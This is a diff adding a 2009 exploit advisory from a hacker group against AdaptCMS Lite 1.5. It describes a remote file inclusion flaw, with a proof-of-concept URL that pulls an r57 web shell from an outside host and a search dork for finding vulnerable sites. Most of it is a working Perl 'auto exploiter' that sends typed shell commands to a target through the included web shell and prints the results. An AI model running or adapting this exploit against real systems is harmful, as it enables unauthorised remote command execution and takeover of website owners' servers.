@@ -1,0 +1,123 @@
+     )   )            )                     (   (         (   (    (       )     )  
+  ( /(( /( (       ( /(  (       (    (     )\ ))\ )      )\ ))\ ) )\ ) ( /(  ( /(  
+  )\())\()))\ )    )\()) )\      )\   )\   (()/(()/(  (  (()/(()/((()/( )\()) )\()) 
+ ((_)((_)\(()/(   ((_)((((_)(  (((_)(((_)(  /(_))(_)) )\  /(_))(_))/(_))(_)\|((_)\  
+__ ((_)((_)/(_))___ ((_)\ _ )\ )\___)\ _ )\(_))(_))_ ((_)(_))(_)) (_))  _((_)_ ((_) 
+\ \ / / _ (_)) __\ \ / (_)_\(_)(/ __(_)_\(_) _ \|   \| __| _ \ |  |_ _|| \| | |/ /  
+ \ V / (_) || (_ |\ V / / _ \  | (__ / _ \ |   /| |) | _||   / |__ | | | .` | ' <   
+  |_| \___/  \___| |_| /_/ \_\  \___/_/ \_\|_|_\|___/|___|_|_\____|___||_|\_|_|\_\  
+
+
+[+] AdaptCMS Lite 1.5 Remote File Inclusion Vulnerability
+[-] Author	: v3n0m
+[-] Contact	: v3n0m666[at]live[dot]com
+[-] Blog	: http://v3n0m.blogdetik.com/
+[-] Group	: YOGYACARDERLINK
+[-] Site	: http://yogyacarderlink.web.id/
+[-] Date	: November, 26-2009 [INDONESIA]
+
+[!] Application	: AdaptCMS Lite
+[!] Vendor	: www.insanevisions.com
+[!] Version	: 1.5 Other versions may also be affected
+[!] Download	: http://sourceforge.net/projects/adaptcms/files/
+[!] License	: Free
+[!] Vulnerable	: Remote File Inclusion
+[!] Google Dork	: Copyright 2006-2009 Insane Visions
+
+
+[o] Description
+
+AdaptCMS is a PHP CMS that is made for complete control of your website, 
+easiness of use and easily adaptable to any type of website. 
+It's made easy with advanced custom fields, 
+a very simple but powerful template system and much more.
+
+
+Vuln Code & PoC
+***************
+Vuln: include_once($sitepath."includes/rss/simplepie.inc");
+
+PoC : http://server/plugins/rss_importer_functions.php?sitepath=http://localhost/r57.txt??
+
+
+AdaptCMS Lite Auto Exploiter
+****************************
+
+#!/usr/bin/perl -w
+
+##################################################################
+# Created by v3n0m                                               #
+# sHoutz: lingah,IdioT_InsidE,LeQhi,aRiee,z0mb13,m4rco,NaZmy,    #
+#	  eidelweiss,JaLi-,Anak_Naga_,g0nz,mywisdom,setanmuda,   #
+#	  yoga0400,ripper_maya,elv1n4,badkiddies,dhit_coxon,     #
+#	  psychotic_girl,jo8928,r4f43l_world,angela zhang        #
+#	  & All YOGYACARDERLINK Crew                             #
+#                                                                #
+# - register_globals = on                                        #
+# - allow_url_include = on                                       #
+# - allow_url_fopen = on                                         #
+##################################################################
+use LWP::UserAgent;
+use HTTP::Request;
+use LWP::Simple;
+use Getopt::Long;
+
+sub clear{
+system(($^O eq 'MSWin32') ? 'cls' : 'clear');
+}
+
+&clear();
+
+sub banner {
+        &clear();
+	print "|---------------------------------------------|\n";
+	print "|       AdaptCMS Lite RFI Auto Injector       |\n";
+	print "| Created  : v3n0m                            |\n";
+	print "| E-mail   : v3n0m666[at]live[dot]com         |\n";
+	print "|                                             |\n";
+	print "|                                             |\n";
+	print "|                  www.yogyacarderlink.web.id |\n";
+	print "|---------------------------------------------|\n\n";
+	print "Usage:\n";
+	print " perl $0 -u \"http://target/[path]/\" -fuck \"http://localhost/r57.txt??\"\n\n";
+        exit();
+}
+
+my $options = GetOptions (
+  'help!'            => \$help, 
+  'u=s'            => \$u, 
+  'fuck=s'            => \$fuck
+  );
+
+&banner unless ($u);
+&banner unless ($fuck);
+
+chomp($u);
+chomp($fuck);
+
+while (){
+
+	print "[shell]:~\$ ";
+	chomp($cmd=<STDIN>);
+
+	if ($cmd eq "exit" || $cmd eq "quit") {
+		exit 0;
+	}
+
+	my $ua = LWP::UserAgent->new;
+        $iny="?&act=cmd&cmd=" . $cmd . "&d=/&submit=1&cmd_txt=1";
+        chomp($iny);
+        my $own = $u . "/plugins/rss_importer_functions.php?sitepath=" . $fuck . $iny;
+        chomp($own);
+	my $req = HTTP::Request->new(GET => $own);
+	my $res = $ua->request($req);
+	my $con = $res->content;
+	if ($res->is_success){
+		print $1,"\n" if ( $con =~ m/readonly> (.*?)\<\/textarea>/mosix);
+	}
+           else
+             {
+                print "Exploiting failed !!\n";
+                exit(1);
+             }
+}
